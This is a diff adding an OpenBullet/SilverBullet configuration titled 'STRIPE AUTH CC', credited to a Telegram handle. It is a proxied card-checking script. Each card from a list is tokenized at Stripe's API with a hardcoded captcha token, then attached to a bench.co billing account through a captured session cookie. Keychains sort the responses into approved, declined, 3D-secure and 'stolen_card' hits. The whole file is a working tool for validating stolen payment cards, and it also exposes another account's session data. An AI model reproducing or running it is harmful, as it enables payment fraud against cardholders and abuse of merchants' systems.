@@ -1,0 +1,206 @@
+[SETTINGS]
+{
+  "Name": "STRIPE AUTH CC @T5B55",
+  "SuggestedBots": 10,
+  "MaxCPM": 0,
+  "LastModified": "2024-08-05T23:15:07.8508127+03:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "Telegram : @salammzori",
+  "Version": "1.1.4 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "STRIPE AUTH CC @T5B55",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#time FUNCTION RandomNum "111111" "999999" -> VAR "time" 
+
+#email FUNCTION RandomString "salamhunter_?l?l?l?l?l?l?l@gmail.com" -> VAR "email" 
+
+#guid FUNCTION GenerateGUID -> VAR "guid" 
+
+#muid FUNCTION GenerateGUID -> VAR "muid" 
+
+#sid FUNCTION GenerateGUID -> VAR "sid" 
+
+REQUEST POST "https://api.stripe.com/v1/tokens" 
+  CONTENT "guid=<guid>&muid=<muid>&sid=e3bf9879-b280-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVSalam+Hunter&card[number]=<cc>&card[cvc]=<cvv>&card[exp_month]=<mes>&card[exp_year]=<ano>&card[address_zip]=10080&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiUDIzVGh3aUtrZ1hyM2d0eXR3SXR5WmlpZHpqSkdOa1RRN2R5VHVCKzUzOWJ1b1EvdTJWclRyRHF4TzZuZzlyVGFReEhBMkZLOWFCbGtheTdNNG5RZWNxeE1HQUtBaVhCVU1CUVUzU2RFU2Z6Y1NTc1NJZ1lmUDkyRXp3ZmtCaHhaV0FxRmtneS9MY0V6UmhDeG9qemRFcmFoVkFqRFc4elpnRXc0RlJhaXZsODNQVCtFSUNZT2JYbDFmaDhFWDB6MTVVYndlWms4bzdobVFWSjRRUzA5K3doVmVheFRFcFFqR2cxUUZUdm8vL0pDdTJkOUpyQUlTRWVLbUhpWjVKSnJUMXhsWmlGTnljZ0dNWkZKNWtUTmhSNFFDWXk3dDBzeFFnczJQOGVPeUxwL1d6QVdJT0MwZDA2ZFlBWExveTBObkxOckIxNnUrMTYzNUs5TzNpeEYvV1Z3WmNQaWtCOUFMSEUxZUp3eDFBUmxTRmswQXVxa2I3cS9ieUpXUmQrK2VEZlJyc2srNUh5Ym1FaFRkMDQ5dFBLZWRscURUVFp6VGdxZHYwc0UrQlRkUFcvYkFJV1g5VXJHYXNuQkJTMUdaUHRnOGI3RFZMcmxIYi84bGFkZUI2V1dMLzR2Yzl5dzJGVVUrN2RPd2F6VFpzWDJVeVQ2R0VwVGprQVJYejlWTUFNV2tmaU1DL3M1dUhOTUFNaXJ0QldyenB4WUlEa3BpVC9jK1RsZDA1eHc2OG1tbVBUMm5zUG4ySWluNmFjR0dlUWVMZlYxN3NGYUwxejFXbHN5dWZZQ3ZlZm10cmJSVG51WFJZb2xWT2lOUzdjL0d4eUVKdlFET0JtT0pETERzZ1dONm1XdzNIRDdLQ1FaQTlaR3NkS0ZTUjNwL3Y4R2o4cXlYSTdZU2cvVEVSRk91Rk5yM0lua29mS3JMYUZkMXNCSWZmS0ZnZzZMQ2Q0NWtGcTBwcGppOTh0NW9GSnk4Y1I2QVpmdnpYcEFOSXJXL2wxQlcvVFRsTlJnZHhVay95azhTMVpENTRkME5JOTlyWUprN2MyTG4yQVlWNG02WjVqS0dza0sxejhzd3Rsd1hmL0E3amVoYTh2Z09UYzBIU2ppYndMbkdsWjJ5eTBIb1UwanFDOE4vVHhvMFpwaDZscHpmb3U0L3pPYk1CTi9MZXhxQVZMTVpJRloxdkJTcTBtT2tCcDhveTdBV2lzbWpXc0Jhc1RPeUxjY3RUTStyN0xIekNlQUZKdFp5cEdWSkJndWZlS0cySTNiNmU1b0VVRHVSSUZoOHdwcHorb0prcERWMkRzVW1hRllvS25nTUR3MmMxY25zZ2pwaTdubGorQloyYlJkN1RFOWlveTdZbjNEQ3YzMVhndTdJSXNSdnc3QnAzV2hreXY5eFY3NTkrb2d1U3JTOFRrM0xLVkxua3BReUNjemk0K0tFN2xha3VESXVrUCt1TE1KVkkwOHc1V25vMXlBTVI3VUVQcWxNckZVTXVXQ01yYUV5TjcwemtZME14UldhdDFKSjRWNFZQa1YySWVZUTEydnh1M0hxMFNWTmxUZnBmbVgrbnVjaldBbWtMaHBWMkJNT3JkbHdIcENrRU9TdnlZYWtmc2FabTBGUGZrQWlxbDM1NFhyenduOFhrWFRQOHpYampzSjhpYnl4ZHRqcWpuRkEzUFdUN0tYdktpYkM0YkFkVXpLN1JaWDZtWFV0cUE0aEpRcHVoOU9VME1YMUNndDZVRjNaU1NVYnEzTW01amJGQ0QvUlFXWDdJMFZtR0svc1hzdEl5b2Z1QWFkdFZHL0R6SG9mdE5GU1RZK055MVdJaFd2ZUd0ODRoQXdkYVg2WmJoaGNYY0xMTXZQZHNDTUx2dXFYSUFJSktHN29BaEo5U2dxT0VMMFRRelBia0FkWVk3SFNSSEtxQVJNVE5vc1lFQ1V5cHZUbTVBNWV3OVVuK1AwVlk0UGk5ZkhrVEhBbk9nY3ZyQzlEUGlRdlNTaExteUcrNHFUeWFiejR1cnZoVnJnZ2M2OFlyWUN6cnk0ODJ0c2E1c05NSm1rdmJ1SUh1d2RpTU1XWmNZYWdoL21FMUJ3QlhSYmRGMjdJeDgwdlMwOXNETFRSaElwNjhoMzB5L1RIcWlSbFV0djJKRDA5bTI4a05MYlpZZlpseVVOZFAzRjNzSkFLdmZISHFRK3NocUxaWHNXcVJrajFsUTJsaTVkbmRRMXVlamNuQUEzd1JhbGpVc3VZNDU4SCtDN2hqMWF4REsxOUNzTC9OcVU3d3pJTWpCNnNROGlEYVlINXk1VFF2bktZSVI0Y0ExcWVyVmhSZXZVMm8rbnoxQ0lUU1RGNHljbnVKT09QdDZTdzdabzVheXdUSXgxV1R0MmpmZEg0QW04RWFRanlwOXEvVmRJSzlQMldSSE9Sa0Y5blNramh6SXNKMmVlc3pBRFQrSXNxWmJ6WnRxODAvanVmcGFudDM1YURWaHp3Uks3RVNOUVdRTjcvekdRUzgwVkpvMFh6K09lKzFuRGRuc0VBVUlzNGU3VFIxY0FqL2h6cEtJS3ZpUVZwaEZxbkNQT1dhdW5SbEVzaHZMSHdWR3VMUDVZY252cFFLMEZjUGZLaVl1dWJxcldHOW5DTmtqZE9SU0puRFpwNXF2M3poa081c2F1M1JuN1YzZ0ErTkZVY3MzYUpodFJhdGJianlYRXFLS2JGVnpCWDhoUEh2Skxsais2MFhwSkxrelNJeUdyeWRCUzFsUm9nbm1MZmZneVFGYzlaR0RRaUM4THZjVlNqYjN5QTBCeG1QbFZDTTgxUUEwTUJpRzBFRjdZVTlrY2JKYitBRnZ6TkhseGZWMlBJak5sUFFNYi82QmIvdDZEKzlOeGJvbzc3eWE5dDVWVENsVHk2bnVHZlpKUTkxSlM4bG1KWTE2azZscFkxTGkyRmM3MHl1M0NSZz0iLCJleHAiOjE3MjI4ODgxNjMsInNoYXJkX2lkIjo1MzU3NjU1OSwia3IiOiIxY2JkZTkyZSIsInBkIjowLCJjZGF0YSI6IkYzQ25zcGlVQUpSTnZLVTZ5eisydUJNcDFqbjFHTE8vNVplYkRQQ0gwWHRRLzhzMGl4eVhmKys2Qk9LaTkvZDljd0pOc3FGWFQ2Q1h1UmZyQitFMFhhN1o5VWlGcEpJby9SWXp1MlBmaGl0RnhzN0JlRmtXK29JK1ZDemlCZ2RsQXhrZXhmU01RdnZ4QmV0cS96ckxMWDl3dkFSRHdJaXlJNTRSNHQ4NVVoS29SZEtucVM2S2ZYN2lsaW5qRGl6Q254UmNtK0pBdmt6V1pnMDIifQ.nUkoiXRg1wAf-tsyv9x_HFzO2jATH61YJDeDgOIKHbk&payment_user_agent=stripe.js%2Fd0ea7b9f10%3B+stripe-js-v3%2Fd0ea7b9f10%3B+card-element&key=pk_ed9IDMDJ6oHh4LZIfEpPHg2GEKfIG" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "cache-control: no-cache" 
+  HEADER "content-length: 3911" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://js.stripe.com" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://js.stripe.com/" 
+  HEADER "sec-ch-ua: \"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "id" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "id" 
+
+#tok PARSE "<SOURCE>" JSON "id" -> VAR "tok" 
+
+#last4 PARSE "<SOURCE>" LR "\"last4\": \"" "\"," -> VAR "last4" 
+
+#exp_month PARSE "<SOURCE>" JSON "exp_month" -> VAR "exp_month" 
+
+#exp_year PARSE "<SOURCE>" JSON "exp_year" -> VAR "exp_year" 
+
+REQUEST POST "https://api.bench.co/api/v1/billing.json/client/194782" 
+  CONTENT "{\"expiryMonth\":\"<exp_month>\",\"expiryYear\":\"<exp_year>\",\"last4digits\":\"<last4>\",\"token\":\"<tok>\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "accept: application/json" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 99" 
+  HEADER "content-type: application/json" 
+  HEADER "Cookie: optimizelyEndUserId=oeu1722887829778r0.1228756238173272; _hjSession_824201=eyJpZCI6IjU1YTk2NWIzLTk1NDQtNGRiZS04OTQ5LTA4NTdlZGUzZWU5OCIsImMiOjE3MjI4ODc4MzMyMjgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _gid=GA1.2.1297594861.1722887833; _tt_enable_cookie=1; _ttp=qZ9G_c_hOcvBChN_vCPCE6zMX49; _fbp=fb.1.1722887834365.945372852281748078; _clck=1d555ou%7C2%7Cfo2%7C0%7C1678; ajs_anonymous_id=c79c340c-3f88-4b63-b0d5-b678f2eb0391; _hjSessionUser_824201=eyJpZCI6IjM2ZjY2ZjQzLTFiZWEtNWI1OS1iNWY0LWVkYjY3NjdjNTkxZSIsImNyZWF0ZWQiOjE3MjI4ODc4MzMyMjUsImV4aXN0aW5nIjp0cnVlfQ==; _hp2_ses_props.554455611=%7B%22r%22%3A%22https%3A%2F%2Fwww.bench.co%2F%22%2C%22ts%22%3A1722887841498%2C%22d%22%3A%22www.bench.co%22%2C%22h%22%3A%22%2Fsignup%22%7D; OptanonAlertBoxClosed=2024-08-05T19:57:28.995Z; OptanonConsent=isGpcEnabled=0&datestamp=Mon+Aug+05+2024+22%3A57%3A29+GMT%2B0300+(Arabian+Standard+Time)&version=202303.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV%3A1%2CC0003%3A1%2CC0001%3A1%2CC0002%3A1&AwaitingReconsent=false; stat_track_u_id=uid%3D1902538138%26f%3D5971%253A3576%26st%3D1%26sy%3D%26ls%3D1722898634%26off%3D%26noacts%3D%26dg%3D%26hs%3D1; _stat_track_s_id=_si%3D1722887840%26_sid%3D1722898634%26_inew%3D1%26_ls%3D1722898634%26_lurl%3D194763397%26_lrfr%3D402561428%26_la%3D1722898650%26_so%3D%26_pp%3D%26_bh%3D440%26_ane%3D%26_te%3D%26_nay%3D%26_nae%3D%26_nac%3D; _ga=GA1.2.2140862956.1722887832; _rdt_uuid=1722887832864.2297245a-04ec-4b77-8c8b-f7d0d2ad2651; _clsk=1x91yjw%7C1722887902416%7C4%7C1%7Cr.clarity.ms%2Fcollect; _gcl_au=1.1.1505092655.1722887831.1397741674.1722887855.1722887906; JSESSIONID=NTU2ZWMxNzEtZTUwOC00MTFhLTllOTYtYmJlNzE4NDNmYmUy; ajs_user_id=185863; _uetsid=e9179020536411efba9f5f633e44dc90; _uetvid=e91c19e0536411ef99d785af9c8f9d06; _ga_ZQV7QPXZQC=GS1.1.1722887832.1.1.1722887919.38.0.0; _hp2_props.554455611=%7B%22email%22%3A%22salammzere40000%40gmail.com%22%2C%22clientId%22%3A%22194782%22%2C%22inboxState%22%3A%22TRIAL_QUALIFY%22%2C%22clientCount%22%3A1%2C%22app%22%3A%22unified%22%2C%22partner%22%3A%22%22%2C%22isWhiteLabel%22%3Afalse%2C%22nff_account_addons-overview_page%22%3A%22off%22%2C%22nff_HCP_Theme%22%3A%22off%22%2C%22nff_report_1099_educational_content%22%3A%22on%22%2C%22nff_auto_client_rule%22%3A%22off%22%2C%22nff_cat_quick_wins_1%22%3A%22on%22%2C%22nff_rtd-categorization_quick_wins-1%22%3A%22on%22%2C%22nff_rtd-categorization_quick_wins-2%22%3A%22on%22%2C%22nff_bk_status_updates%22%3A%22on%22%2C%22nff_bench_tax_page%22%3A%22on%22%2C%22nff_goal_based_nav_content_updates%22%3A%22off%22%2C%22nff_rutter_amazon_integration%22%3A%22on%22%2C%22nff_bk_status_clientUI%22%3A%22on%22%2C%22nff_bk_status_clientUI_M2%22%3A%22on%22%2C%22nff_catbot_beta%22%3A%22off%22%2C%22nff_suggested_categories_in_chat%22%3A%22off%22%2C%22nff_date_picker-phase_1%22%3A%22on%22%2C%22nff_customer_document_management%22%3A%22off%22%2C%22nff_catbot_manual_categorization%22%3A%22off%22%2C%22nff_catbot_similar_transactions%22%3A%22off%22%2C%22nff_federated_micro_frontends%22%3A%22control%22%2C%22nff_categorization_assistant_feedback_improvements%22%3A%22off%22%7D; _hp2_id.554455611=%7B%22userId%22%3A%22218369737799776%22%2C%22pageviewId%22%3A%223251595541376787%22%2C%22sessionId%22%3A%227864444819608536%22%2C%22identity%22%3A%22185863%22%2C%22trackerVersion%22%3A%224.0%22%2C%22identityField%22%3Anull%2C%22isIdentified%22%3A1%7D" 
+  HEADER "Host: api.bench.co" 
+  HEADER "Origin: https://app.bench.co" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://app.bench.co/" 
+  HEADER "sec-ch-ua: \"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" 
+
+#message PARSE "<SOURCE>" LR "\"messages\":[{\"message\":\"" "\"" CreateEmpty=FALSE -> CAP "message" 
+
+#CC_CHECK KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Your card does not support this type of purchase" 
+    KEY "card_not_supported" 
+    KEY "The card was declined for an unknown reason" 
+    KEY "incorrect_number" 
+    KEY "do_not_honor" 
+    KEY "card_declined" 
+    KEY "Card is declined by your bank, please contact them for additional primaryrmation." 
+    KEY "fraudulent" 
+    KEY "The card was declined." 
+    KEY "Your card's expiration year is invaild." 
+    KEY "Your card was declined.\"],\"donation_id\"" 
+    KEY "Generic Decline" 
+    KEY "invalid_expiry_month" 
+    KEY "Your card's expiration year is invalid" 
+    KEY "Your card's expiration month is invalid" 
+    KEY "Your card's security code is invalid" 
+    KEY "Your card number is incorrect." 
+    KEY "Your card was declined." 
+    KEY "Your card is not supported for this currency." 
+    KEY "Your card is not supported" 
+    KEY "invalid_account" 
+    KEY "generic_decline" 
+    KEY "Your card has expired." 
+    KEY "You have exceeded the maximum number of declines on this card in the last 24 hour period." 
+    KEY "Invalid account." 
+    KEY "No such PaymentMethod" 
+    KEY "A valid payment method must be attached to your account." 
+    KEY "Your card does not support this type of purchase" 
+    KEY "Unknown error generating account. Please contact us to set up your membership" 
+    KEY "transaction_not_allowed" 
+    KEY "parameter_invalid_integer" 
+    KEY "The Math Question field is required." 
+    KEY "Invalid Captcha." 
+    KEY "message\":\"Unable to verify your request. Please reload the page and try again." 
+    KEY "Sorry, your session has expired." 
+  KEYCHAIN Success OR 
+    KEY "Payment successful" 
+    KEY "\"status\":\"success\"" 
+    KEY "\"cvc_check\": \"pass\"" 
+    KEY "\"status\": \"succeeded\"" 
+    KEY "https://assistu2win.com/wp-content/uploads/2018/01/weclome-message.jpg" 
+    KEY "Merci pour votre achat." 
+    KEY "Your transaction has been processed successfully." 
+    KEY "Payment successful!" 
+    KEY "Your new subscription has been activated" 
+    KEY "Thank you" 
+    KEY "Successfully" 
+    KEY "Success" 
+    KEY "Your order is confirmed" 
+    KEY "Your card's security code is incorrect" 
+    KEY "Your card has insufficient funds." 
+    KEY "requires_action" 
+    KEY "\"status\": \"requires_action\"" 
+    KEY "stripe_3ds2_fingerprint" 
+    KEY "Thank you. Your order has been received." 
+    KEY "Your order has been received." 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "stolen_card" 
+    KEY "lost_card" 
+  KEYCHAIN Custom "3D" OR 
+    KEY "{\"status\":2,\"url\":\"https:\\/\\/hooks.stripe.com\\/3d_secure_2" 
+  KEYCHAIN Ban OR 
+    KEY " This account has been flagged for abuse and/or violation of the Eventive Terms of Service.\"}}" 
+  KEYCHAIN Retry OR 
+    KEY "An error occurred while processing your card. Try again in a little bit" 
+    KEY "verify_challenge" 
+
+FUNCTION Constant "APPROVED ✅" -> CAP "CCN" 
+
+FUNCTION Constant "@T5B55 | @salammzori " -> CAP "BY" 
+
